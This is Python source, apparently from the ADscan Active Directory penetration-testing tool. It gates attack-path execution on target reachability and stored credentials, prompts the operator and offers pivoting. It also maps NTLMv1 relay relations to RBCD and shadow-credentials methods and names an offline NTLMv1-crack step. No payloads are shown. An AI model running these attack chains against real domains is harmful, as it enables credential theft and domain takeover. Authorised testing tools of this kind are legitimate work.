            blocked_reason = "target_computer_disabled"
            support_reason = "Host-bound execution is blocked because the target computer is disabled."
        elif target_viability_status == "resolved_but_unreachable":
            blocked_reason = "target_computer_unreachable_from_current_vantage"
            support_reason = (
                "Host-bound execution is blocked because the target computer is unreachable "
                "from the current vantage."
            )
        elif target_viability_status == "enabled_but_unresolved":
            blocked_reason = "target_computer_enabled_but_unresolved"
            support_reason = (
                "Host-bound execution is blocked because the target computer is enabled in AD "
                "but has no resolvable current-vantage target."
            )
        elif target_viability_status == "not_in_enabled_inventory":
            blocked_reason = "target_computer_not_in_enabled_inventory"
            support_reason = (
                "Host-bound execution is blocked because the target computer is not present in "
                "the enabled-computer inventory."
            )
        if blocked_reason:
            return {
                "execution_context_required": True,
                "execution_support_status": "blocked",
                "execution_support_reason": support_reason,
                "execution_support_target_kind": target_kind or "Unknown",
                "execution_target_enabled": target_enabled,
                "execution_target_enabled_source": target_enabled_source,
                "execution_target_viability_status": target_viability_status,
                "execution_target_viability_summary": target_viability_summary,
                "execution_target_viability_reason": target_viability_reason,
                "execution_target_reachable": target_reachable,
                "execution_target_reachable_source": target_reachable_source,
                "execution_target_resolved": target_resolved,
                "execution_target_matched_ips": list(target_matched_ips),
                "execution_target_vantage_mode": target_vantage_mode,
                "execution_target_execution_advisory": target_execution_advisory,
                "execution_target_access_requirement": target_access_requirement,
                "execution_target_access_mode": target_access_mode,
                "execution_target_required_service": target_required_service,
                "execution_target_required_ports": list(target_required_ports),
                "execution_target_access_rationale": target_access_rationale,
                "execution_target_label": to_label,
                "execution_ready_count": 0,
                "execution_candidate_count": 0,
                "execution_candidate_source": "blocked",
                "execution_readiness_reason": blocked_reason,
                "execution_context_action": action,
            }

    normalized_context_user = _normalize_account(context_username or "")
    if normalized_context_user:
        ready = bool(
            context_password
            or _resolve_domain_password(shell, domain, normalized_context_user)
        )
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_access_mode": target_access_mode,
            "execution_target_required_service": target_required_service,
            "execution_target_required_ports": list(target_required_ports),
            "execution_target_access_rationale": target_access_rationale,
            "execution_target_label": to_label,
            "execution_ready_count": 1 if ready else 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "context_username",
            "execution_readiness_reason": (
                "context_username" if ready else "context_username_missing_credential"
            ),
            "execution_context_action": action,
        }

    normalized_from_user = _normalize_account(from_label)
    from_node = (
        get_node_by_label(shell, domain, label=from_label) if from_label else None
    )
    from_kind = ""
    if isinstance(from_node, dict):
        kind = from_node.get("kind") or from_node.get("labels") or from_node.get("type")
        if isinstance(kind, list) and kind:
            from_kind = str(kind[0])
        elif isinstance(kind, str):
            from_kind = kind
    if normalized_from_user and normalized_from_user in stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_access_mode": target_access_mode,
            "execution_target_required_service": target_required_service,
            "execution_target_required_ports": list(target_required_ports),
            "execution_target_access_rationale": target_access_rationale,
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_credential",
            "execution_readiness_reason": "from_label_credential",
            "execution_context_action": action,
        }
    if normalized_from_user and from_kind.strip().lower() == "user":
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_access_mode": target_access_mode,
            "execution_target_required_service": target_required_service,
            "execution_target_required_ports": list(target_required_ports),
            "execution_target_access_rationale": target_access_rationale,
            "execution_ready_count": 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_user_node",
            "execution_readiness_reason": "from_label_missing_stored_credential",
            "execution_context_action": action,
        }

    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    affected_users = meta.get("affected_users") if isinstance(meta, dict) else None
    affected_count = _affected_user_count(summary)
    if isinstance(affected_users, list) and affected_users:
        ready_users: list[str] = []
        for raw_user in affected_users:
            if not isinstance(raw_user, str):
                continue
            normalized = _normalize_account(raw_user)
            if normalized and normalized in stored_creds:
                ready_users.append(normalized)
        ready_users = list(dict.fromkeys(ready_users))
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_access_mode": target_access_mode,
            "execution_target_required_service": target_required_service,
            "execution_target_required_ports": list(target_required_ports),
            "execution_target_access_rationale": target_access_rationale,
            "execution_target_label": to_label,
            "execution_ready_count": len(ready_users),
            "execution_candidate_count": affected_count or len(affected_users),
            "execution_candidate_source": "affected_users",
            "execution_readiness_reason": (
                "affected_users_intersection"
                if ready_users
                else "no_stored_credential_for_affected_users"
            ),
            "execution_context_action": action,
        }

    if stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_access_mode": target_access_mode,
            "execution_target_required_service": target_required_service,
            "execution_target_required_ports": list(target_required_ports),
            "execution_target_access_rationale": target_access_rationale,
            "execution_ready_count": len(stored_creds),
            "execution_candidate_count": len(stored_creds),
            "execution_candidate_source": "all_stored_credentials_fallback",
            "execution_readiness_reason": "all_stored_credentials_fallback",
            "execution_context_action": action,
        }

    return {
        "execution_context_required": True,
        "execution_support_status": "supported",
        "execution_support_target_kind": target_kind or "",
        "execution_target_enabled": target_enabled,
        "execution_target_enabled_source": target_enabled_source,
        "execution_target_viability_status": target_viability_status,
        "execution_target_viability_summary": target_viability_summary,
        "execution_target_viability_reason": target_viability_reason,
        "execution_target_reachable": target_reachable,
        "execution_target_reachable_source": target_reachable_source,
        "execution_target_resolved": target_resolved,
        "execution_target_matched_ips": list(target_matched_ips),
        "execution_target_vantage_mode": target_vantage_mode,
        "execution_target_execution_advisory": target_execution_advisory,
        "execution_target_access_requirement": target_access_requirement,
        "execution_target_access_mode": target_access_mode,
        "execution_target_required_service": target_required_service,
        "execution_target_required_ports": list(target_required_ports),
        "execution_target_access_rationale": target_access_rationale,
        "execution_ready_count": 0,
        "execution_candidate_count": 0,
        "execution_candidate_source": "unresolved",
        "execution_readiness_reason": "no_stored_credentials_available",
        "execution_context_action": action,
    }


def _annotate_execution_readiness(
    shell: Any,
    *,
    domain: str,
    summaries: list[dict[str, Any]],
    context_username: str | None,
    context_password: str | None,
) -> list[dict[str, Any]]:
    """Attach execution readiness metadata used by the attack-path UX.

    Runs inside an ``annotation_log_dedup_scope`` so the per-summary debug
    logs (``[viability-gate]`` and ``[target-access]``) collapse to one
    line per unique target/relation across the batch.  Without this, a
    workspace with 12k paths sharing a single blocking host emitted 25k+
    identical debug lines under ``--debug``.
    """
    from adscan_internal.services._annotation_log_dedup import (
        annotation_log_dedup_scope,
    )

    annotated: list[dict[str, Any]] = []
    with annotation_log_dedup_scope() as _dedup:
        for summary in summaries:
            annotated.append(
                annotate_summary_execution_readiness(
                    shell,
                    domain=domain,
                    summary=summary,
                    context_username=context_username,
                    context_password=context_password,
                )
            )
        if _dedup:
            print_info_debug(
                f"[annotate-batch] suppressed duplicate debug lines: "
                f"{len(_dedup)} unique key(s) across {len(summaries)} path(s) annotated"
            )
    return annotated


def annotate_summary_execution_readiness(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
) -> dict[str, Any]:
    """Return a copy of *summary* with the readiness gate metadata applied.

    This is the canonical way for any entry point that may execute one attack
    path to attach the reachability/credential gate metadata before deciding
    whether to offer execution.  Callers that omit ``context_username`` /
    ``context_password`` get the same gate result as the listing flow when no
    additional credential context is available.
    """
    current = dict(summary)
    meta = current.get("meta")
    if not isinstance(meta, dict):
        meta = {}
        current["meta"] = meta
    else:
        meta = dict(meta)
        current["meta"] = meta
    readiness = _execution_readiness_meta(
        shell,
        domain=domain,
        summary=current,
        context_username=context_username,
        context_password=context_password,
    )
    if readiness:
        meta.update(readiness)
    return current


# ── NTLMv1 coerce→relay execution dispatch (sub-project #3) ────────────────────
# The relay relations map to the existing native handler ``run_relay_ldap``
# (``relay_rbcd.py``), which already owns coerce + drop-the-MIC relay + the
# RBCD / shadow-creds write method + the create-vs-reuse delegate selector + the
# feasibility gates. The graph relation IS the technique: the RBCD path runs
# ``forced_method="rbcd"``; the ShadowCreds path runs ``forced_method="shadow-creds"``
# (the CLI method spelling, with a hyphen — see ``relay_rbcd._METHOD_SHADOW``).
_NTLMV1_RELAY_METHOD_BY_RELATION: dict[str, str] = {
    "ntlmv1relayrbcd": "rbcd",
    "ntlmv1relayshadowcreds": "shadow-creds",
}


def relay_method_for_relation(relation: str) -> str | None:
    """Return the ``run_relay_ldap`` method for an NTLMv1 relay relation, else None.

    Only the two RELAY relations map here; ``CrackNTLMv1`` is an offline-crack
    technique with its own dispatch arm (it does not drive ``run_relay_ldap``).
    """
    return _NTLMV1_RELAY_METHOD_BY_RELATION.get(str(relation or "").strip().lower())


def is_crackntlmv1_relation(relation: str) -> bool:
    """Return True when ``relation`` is the offline NTLMv1-crack attack step."""
    return str(relation or "").strip().lower() == "crackntlmv1"


def build_relay_ldap_args_for_step(
    *,
    victim_ip: str,
    domain: str,
) -> str:
    """Build the ``run_relay_ldap`` argument string for a relay attack-step.

    The victim IP is the positional target; the relay-target DC is resolved by
    the handler from domain context, so only the victim + domain are passed.
    ``forced_method`` is supplied separately by the dispatch branch.
    """
    parts = [str(victim_ip or "").strip()]
    dom = str(domain or "").strip()
    if dom:
        parts.append(f"--domain {dom}")
    return " ".join(p for p in parts if p)


def _resolve_step_victim_ip(shell: Any, domain: str, computer_label: str) -> str:
    """Resolve a Computer node label to a reachable IP for the relay handler.

    Reuses the canonical target-viability resolver (the same single source of
    truth the execution-gate uses for every Computer target), which returns the
    matched IPs from the workspace inventory. Returns ``""`` when no IP is known.
    """
    label = str(computer_label or "").strip()
    if not label:
        return ""
    # Already an IP → use it as-is.
    resolved = _resolve_session_target_ip(label)
    if resolved and resolved != label:
        # gethostbyname succeeded (label was a hostname).
        pass
    node = get_node_by_label(shell, domain, label=label)
    if isinstance(node, dict):
        try:
            viability = assess_computer_target_viability(
                shell, domain=domain, principal_name=label, node=node,
            )
            for ip in viability.matched_ips or ():
                ip_str = str(ip or "").strip()
                if ip_str:
                    return ip_str
        except Exception as exc:  # noqa: BLE001 — telemetry sink, fall through
            telemetry.capture_exception(exc)
    # Fallbacks: a DNS-resolvable hostname, else the bare label only if it is
    # already an IP (so we never feed the relay handler a hostname it can't use).
    if resolved and resolved != label:
        return resolved
    return ""


def offer_attack_path_execution(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    allowed: bool,
    context_username: str | None = None,
    context_password: str | None = None,
    search_mode_label: str | None = None,
) -> bool:
    """Canonical UX helper: gate-check, prompt, execute — in that order.

    Encapsulates the offer-then-execute pattern that is shared between the
    interactive listing flow and the path-detail entry point in
    ``run_attack_paths``.  Callers pass ``allowed=True`` when the scope and
    TTY check permit execution, ``allowed=False`` to skip silently.

    When the gate refuses the path because the target host is unreachable,
    the pivoting follow-up is offered automatically — same UX the listing
    flow surfaces for blocked paths.

    Returns True when execution was started OR when a pivot probe ran
    (both signal state changed: the caller should recompute summaries).
    Returns False when nothing state-changing happened (user declined,
    unsupported path with no viable pivot, or gate refused).
    """
    if not allowed:
        return False
    annotated = annotate_summary_execution_readiness(
        shell,
        domain=domain,
        summary=summary,
        context_username=context_username,
        context_password=context_password,
    )
    meta = annotated.get("meta") or {}
    support_status = str(meta.get("execution_support_status") or "").strip().lower()
    if support_status in {"unsupported", "blocked"}:
        reason = str(meta.get("execution_support_reason") or "").strip()
        print_warning(
            "ADscan refuses to execute this attack path: "
            + (reason or "execution is not supported from the current vantage.")
        )
        advisory = str(meta.get("execution_target_execution_advisory") or "").strip()
        if advisory:
            print_info(advisory)
        viability_status = (
            str(meta.get("execution_target_viability_status") or "").strip().lower()
        )
        target_label = str(meta.get("execution_target_label") or "").strip()
        if target_label and viability_status:
            # Inference short-circuit: if every reasonable source (direct
            # vantage + every probed pivot) has already failed to reach
            # the target, do not run the pivot UX again. The negative
            # evidence is already persisted; re-probing wastes a WinRM
            # session.
            matched_ips = [
                str(ip).strip()
                for ip in (meta.get("execution_target_matched_ips") or [])
                if str(ip).strip()
            ]
            _skip_pivot = False
            if matched_ips:
                from adscan_internal.services.target_reachability_inference_service import (
                    infer_target_reachability,
                )
                for _ip in matched_ips:
                    _verdict = infer_target_reachability(shell, domain=domain, target_ip=_ip)
                    if _verdict.globally_unreachable:
                        _skip_pivot = True
                        from adscan_internal import print_info_debug as _dbg
                        _dbg(
                            "[attack_paths] skipping pivot UX (offer_attack_path_execution) — "
                            f"target globally unreachable: ip={mark_sensitive(_ip, 'ip')} "
                            f"rationale={mark_sensitive(_verdict.rationale, 'detail')}"
                        )
                        break
            if not _skip_pivot:
                _pivot_evaluated = maybe_offer_pivot_opportunity_for_host_viability(
                    shell,
                    domain=domain,
                    blocked_target=target_label,
                    viability_status=viability_status,
                    operator_summary=None,
                )
                # Pivot UX ran (and may have probed + persisted a report).
                # Tell the caller to recompute so the table reflects the
                # new inference state (the just-probed pivot becomes
                # negative evidence for any path sharing this target).
                if _pivot_evaluated:
                    return True
        return False
    if not Confirm.ask("Execute this attack path now?", default=True):
        return False
    execute_selected_attack_path(
        shell,
        domain,
        summary=annotated,
        context_username=context_username,
        context_password=context_password,
        search_mode_label=search_mode_label,
    )
    return True


def _path_has_ready_execution_context(summary: dict[str, Any]) -> bool:
    """Return True when a path has usable execution context or does not require it."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    if not meta.get("execution_context_required"):
        return True
    ready_count = meta.get("execution_ready_count")
    return isinstance(ready_count, int) and ready_count > 0


def _path_is_supported_for_execution(summary: dict[str, Any]) -> bool:
    """Return False when the path is pre-identified as unsupported or blocked."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    return str(meta.get("execution_support_status") or "").strip().lower() not in {
        "unsupported",
        "blocked",
    }


def attack_path_session_signature(summary: dict[str, Any]) -> tuple | None:
    """Return a stable cross-refresh identity for a path summary.

    The summary dicts are recreated on every refresh — Python identity
    (``id(summary)``) is therefore useless for "have we already tried
    this path in this session?". Index positions also reset because the
    refresh re-ranks the list (a step transitioning to ``success`` moves
    the path to a different bucket). The only reliable identifier is a
    hash of the **logical path itself**: the source principal, the
    terminal target, and the node sequence in between.

    Defense-in-depth motivation (the reason this function exists at all):
    even when ``_path_is_actionable_for_execution_prompt`` derives the
    correct ``actionable`` set, the **default selection** in the picker
    can still land on a path we just tried if the step status update
    failed silently (the path still reads ``theoretical`` and admits
    selection). Tracking attempts at the path-identity level closes that
    loop. The bug class it defends against:

    * A vendor-side regression that swallows the edge-status write.
    * A race between cleanup-revert and refresh that re-sets the status.
    * A future engine that returns paths without per-step status.
    * Any code path that fails to call ``update_edge_status_by_labels``
      after a successful exec.

    In all those cases, the index-based ``_tried_idx_set`` is reset on
    refresh and the status-based actionability gate admits the path
    again — but this signature does **not** reset. The path can only be
    re-selected manually by the operator in interactive mode; CI is
    guaranteed to converge.

    The signature components, in order of preference:

    1. ``_exact_signature`` — populated by ``attack_graph_core`` at
       materialisation time. Includes the exact node sequence and the
       relation identity tuple, so two paths that share endpoints but
       traverse different intermediate nodes get different signatures.
       This is the canonical identifier when available.
    2. Synthetic fallback ``(source, target, tuple(nodes))`` — covers
       summaries that lack ``_exact_signature`` (older engines, manual
       dict construction in tests). Stable enough for the guardrail
       because the same logical path always materialises the same node
       sequence.

    Returns ``None`` when neither identifier can be computed (e.g. the
    summary is missing both ``_exact_signature`` and ``nodes``). The
    caller treats ``None`` as "do not record" — better to risk one
    extra retry than to suppress every path in the session by hashing
    the empty tuple.
    """
    if not isinstance(summary, dict):
        return None
    sig = summary.get("_exact_signature")
    if sig is not None:
        try:
            hash(sig)
            return sig if isinstance(sig, tuple) else (sig,)
        except TypeError:
            # _exact_signature exists but contains an unhashable nested
            # element (e.g. a list someone smuggled in). Fall through to
            # the synthetic identifier — safer than crashing the loop.
            pass
    source = str(summary.get("source") or "")
    target = str(summary.get("target") or "")
    nodes = summary.get("nodes")
    if isinstance(nodes, list) and nodes:
        if not source:
            source = str(nodes[0] or "")
        if not target:
            target = str(nodes[-1] or "")
        if source and target:
            return (source, target, tuple(str(n) for n in nodes))
    # Lenient fallback: ``source`` + ``target`` alone is a coarser
    # identifier than the full node sequence, but it is still strong
    # enough for the guardrail purpose. Two paths that share both
    # endpoints but traverse different intermediate nodes will collide
    # in this set — preventing one from being retried after the other
    # was attempted. That is the conservative direction: a false
    # collision merely declines an extra attempt; missing this
    # signature entirely (the previous behaviour) lets a misshapen
    # summary loop infinitely because no record is kept. Production
    # paths always populate ``nodes`` so they hit the strict branch
    # above; the fallback exists for tests and for any future engine
    # that emits a slimmer summary shape.
    if source and target:
        return ("source_target_only", source, target)
    return None


def autocorrect_summary_statuses_from_steps(
    records: list[dict[str, Any]],
    *,
    domain: str,
) -> int:
    """Re-derive ``record['status']`` from ``record['steps']`` in-place.

    This is the defensive guard that keeps the post-execution refresh loop
    from spinning forever when an upstream caller (or a future engine
    refactor) hands back summaries whose top-level ``status`` field is
    stale relative to the live step statuses they carry.

    The 2026-05-20 incident (HTB Puppy, ``adscan ci``) showed why this is
    load-bearing: the CI fallback in ``attack_graph_reports.py`` was the
    one caller of ``offer_attack_paths_for_execution_summaries`` that
    forgot to thread ``recompute_summaries``. The downstream
    ``_refresh_summaries`` therefore reused the pre-execution snapshot,
    every record stayed at ``status='theoretical'`` even after the steps
    transitioned to ``success``, and
    :func:`_path_is_actionable_for_execution_prompt` re-selected the same
    path forever — visible in the logs as repeated ``re-prompting after
    execution`` lines with ``actionable=1`` and no fresh DFS pipeline
    between iterations. The root-cause wiring is now in place, but this
    guard exists so a future eighth caller that makes the same mistake
    cannot reintroduce the loop.

    Args:
        records: Summary dicts as produced by ``get_attack_path_summaries``.
            Mutated in-place when drift is detected. Items that are not
            dicts, or that lack a non-empty ``steps`` list, are skipped.
        domain: Domain name — only used for the debug log line so the
            message ties back to the active engagement.

    Returns:
        Number of records whose ``status`` was rewritten. Useful for
        tests and telemetry; production callers can ignore it.

    Notes:
        The derivation helper called here
        (:func:`_derive_display_status_from_steps` in
        ``attack_paths_core``) is the same one used by the renderer-side
        drift detector in ``adscan_core/output/_attack_paths.py``, so
        the two layers cannot diverge. If the drift detector reports a
        mismatch but this guard does not fix it, the bug is in the
        derivation helper itself — not in this function.
    """
    if not records:
        return 0

    from adscan_internal.services.attack_paths_core import (
        _CONTEXT_RELATIONS_LOWER,
        _derive_display_status_from_steps,
    )

    fixed = 0
    marked_domain = mark_sensitive(domain, "domain")
    for record in records:
        if not isinstance(record, dict):
            continue
        steps = record.get("steps")
        if not isinstance(steps, list) or not steps:
            continue

        # Critical safety rule: never auto-correct if the steps lack
        # explicit per-step status data. ``_derive_display_status_from_steps``
        # returns ``'theoretical'`` as its default when no step carries a
        # status value — which would silently DOWNGRADE a correct
        # ``'exploited'`` (or ``'attempted'``) summary to ``'theoretical'``
        # whenever the recompute callback returns records that store the
        # rollup at summary level only. The guard's purpose is to fix
        # stale rollups using LIVE step evidence; if there is no live step
        # evidence, the existing rollup is the most reliable value we have.
        has_executable_status = any(
            isinstance(step, dict)
            and str(step.get("status") or "").strip()
            and str(step.get("action") or "").strip().lower()
            not in _CONTEXT_RELATIONS_LOWER
            for step in steps
        )
        if not has_executable_status:
            continue

        fresh = _derive_display_status_from_steps(steps)
        current = str(record.get("status") or "").strip().lower()
        if fresh and fresh != current:
            print_info_debug(
                "[attack_paths] status auto-corrected from steps: "
                f"domain={marked_domain} "
                f"old={current or 'theoretical'!r} new={fresh!r}"
            )
            record["status"] = fresh
            fixed += 1
    return fixed


def _path_is_actionable_for_execution_prompt(
    summary: dict[str, Any],
    *,
    desired_statuses: set[str] | None,
) -> bool:
    """Return True when a path is worth re-prompting for execution."""
    status = str(summary.get("status") or "theoretical").strip().lower()
    if desired_statuses is not None and not _status_allowed_by_filter(
        status, desired_statuses
    ):
        return False
    if status not in {"theoretical", "attempted"}:
        return False
    if not _path_is_supported_for_execution(summary):
        return False
    if not _path_has_ready_execution_context(summary):
        return False
    return True


def _execution_block_message(meta: dict[str, Any]) -> tuple[str, str]:
    """Return user-visible warning and debug reason for one blocked execution summary."""
    support_reason = str(meta.get("execution_support_reason") or "").strip()
    readiness_reason = str(meta.get("execution_readiness_reason") or "").strip()
    viability_summary = str(
        meta.get("execution_target_viability_summary") or ""
    ).strip()
    if support_reason:
        return support_reason, readiness_reason or "execution_blocked"
    if viability_summary:
        return viability_summary, readiness_reason or "execution_blocked"
    return (
        "This path is currently blocked by target viability or execution policy.",
        readiness_reason or "execution_blocked",
    )


def _summarize_non_actionable_paths(
    summaries: list[dict[str, Any]],
    *,
    desired_statuses: set[str] | None,
) -> tuple[int, dict[str, int]]:
    """Return count and reason buckets for non-actionable path summaries."""
    reasons = {
        "exploited": 0,
        "blocked": 0,
        "unsupported": 0,
        "unavailable": 0,
        "needs_context": 0,
        "status_filtered": 0,
        "other": 0,
    }
    for summary in summaries:
        status = str(summary.get("status") or "theoretical").strip().lower()
        if desired_statuses is not None and not _status_allowed_by_filter(
            status, desired_statuses
        ):
            reasons["status_filtered"] += 1
            continue
        if status == "exploited":
            reasons["exploited"] += 1
            continue
        if status == "blocked":
            reasons["blocked"] += 1
            continue
        if status == "unsupported":
            reasons["unsupported"] += 1
            continue
        if status == "unavailable":
            reasons["unavailable"] += 1
            continue
        meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
        support_status = (
            str(meta.get("execution_support_status") or "").strip().lower()
            if isinstance(meta, dict)
            else ""
        )
        if support_status == "blocked":
            reasons["blocked"] += 1
            continue
        if not _path_is_supported_for_execution(summary):
            reasons["unsupported"] += 1
            continue
        if not _path_has_ready_execution_context(summary):
            reasons["needs_context"] += 1
            continue
        reasons["other"] += 1
    return sum(reasons.values()), reasons


def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
    """Return a compact visible breakdown of non-actionable path reasons."""
    parts: list[str] = []
    labels = (
        ("exploited", "exploited"),
        ("blocked", "blocked"),
        ("unsupported", "unsupported"),
        ("unavailable", "unavailable"),
        ("needs_context", "needs_context"),
        ("status_filtered", "filtered"),
        ("other", "other"),
    )
    for key, label in labels:
        count = int(reasons.get(key, 0) or 0)
        if count > 0:
            parts.append(f"{label}={count}")
    return ", ".join(parts) if parts else "none"


def _attack_path_step_readiness_reason(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    step_index: int,
    context_username: str | None,
    context_password: str | None,
) -> str:
    """Return an empty string if the step is ready, otherwise a short reason.

    Mirrors :func:`_attack_path_step_has_executable_context` but produces a
    user-facing explanation of which precondition is missing (credentials,
    target reachability, ...). Kept separate so the boolean fast path stays
    cheap for the existing skip-success logic.
    """
    if step_index < 1 or step_index > len(steps):
        return "invalid step index"
    step_item = steps[step_index - 1]
    if not isinstance(step_item, dict):
        return "invalid step payload"

    step_action = str(step_item.get("action") or "").strip()
    step_key = step_action.lower()
    step_details = (
        step_item.get("details") if isinstance(step_item.get("details"), dict) else {}
    )
    from_label = str(step_details.get("from") or "").strip()
    to_label = str(step_details.get("to") or "").strip()
    if not step_action:
        return "no action"

    if step_key in ACL_ACE_RELATIONS:
        try:
            exec_context = build_ace_step_context(
                shell,
                domain,
                relation=step_action,
                summary=summary,
                from_label=from_label,
                to_label=to_label,
                context_username=context_username,
                context_password=context_password,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            return "context resolution failed"
        if not str(getattr(exec_context, "exec_username", "") or "").strip():
            return f"no controller for {from_label or '?'}"
        if not str(getattr(exec_context, "exec_password", "") or "").strip():
            principal = (
                str(getattr(exec_context, "exec_username", "") or "").strip()
                or from_label
                or "?"
            )
            return f"missing credentials for {principal}"
        return ""

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return f"no executor resolved for {from_label or '?'}"
    exec_password = _resolve_attack_path_step_password(
        shell,
        domain=domain,
        exec_username=exec_username,
        context_username=context_username,
        context_password=context_password,
    )
    if not exec_password:
        return f"missing credentials for {exec_username}"

    if step_key in {"adminto", "sqlaccess", "sqladmin", "canrdp", "canpsremote"}:
        if not (
            to_label
            and resolve_netexec_target_for_node_label(
                shell,
                domain,
                node_label=to_label,
            )
        ):
            return f"target {to_label or '?'} unreachable"
    elif step_key == "allowedtodelegate":
        if not (from_label and to_label):
            return "missing delegation endpoints"
    elif step_key == "allowedtoact":
        # Inbound RBCD: from_label is the trustee (often a group), to_label is
        # the target computer whose msDS-AllowedToActOnBehalfOfOtherIdentity
        # grants delegation. The target is the load-bearing endpoint.
        if not to_label:
            return "missing RBCD target"
    elif step_key == "writelogonscript":
        domain_data = (
            getattr(shell, "domains_data", {}).get(domain, {})
            if isinstance(getattr(shell, "domains_data", None), dict)
            else {}
        )
        if not (
            str(step_details.get("host") or "").strip()
            or _resolve_default_domain_controller(domain_data, domain)
        ):
            return "no host or DC available"
    return ""


def _choose_custom_attack_path_start_step(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    default_step_idx: int,
    context_username: str | None = None,
    context_password: str | None = None,
) -> int | None:
    """Let the operator choose a custom executable step index.

    Each executable step is annotated with a readiness tag computed against
    the current credential store and runtime context:

    * ``[ready]`` — preconditions satisfied, ADscan can run it now.
    * ``[locked — <reason>]`` — preconditions missing (credentials, reachable
      target, ...). The option is still selectable so power users can override
      a stale resolver decision; selecting it triggers an auto-resolve confirm
      that offers to start from the first ready step instead.
    """
    if not hasattr(shell, "_questionary_select"):
        return default_step_idx

    readiness: list[tuple[bool, str]] = []
    first_ready_idx: int | None = None
    options: list[str] = []
    default_option_idx = 0
    for option_idx, step_idx in enumerate(executable_indices):
        step_item = steps[step_idx - 1] if step_idx - 1 < len(steps) else {}
        action = str(step_item.get("action") or "N/A").strip() or "N/A"
        status = str(step_item.get("status") or "discovered").strip().lower()
        from_label = (
            str(
                (step_item.get("details") or {}).get("from")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        to_label = (
            str(
                (step_item.get("details") or {}).get("to")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        lock_reason = _attack_path_step_readiness_reason(
            shell,
            domain=domain,
            summary=summary,
            steps=steps,
            step_index=step_idx,
            context_username=context_username,
            context_password=context_password,
        )
        is_ready = not lock_reason
        readiness.append((is_ready, lock_reason))
        if is_ready and first_ready_idx is None:
            first_ready_idx = step_idx
        readiness_tag = "[ready]" if is_ready else f"[locked — {lock_reason}]"
        options.append(
            f"Step #{step_idx}: {action} [{status}] {from_label} -> {to_label} "
            f"{readiness_tag}"
        )
        if step_idx == default_step_idx:
            default_option_idx = option_idx
    options.append("Cancel execution")

    # If the suggested default is locked but a ready step exists, prefer it
    # so the cursor lands on something the user can run without overrides.
    if (
        readiness
        and not readiness[default_option_idx][0]
        and first_ready_idx is not None
    ):
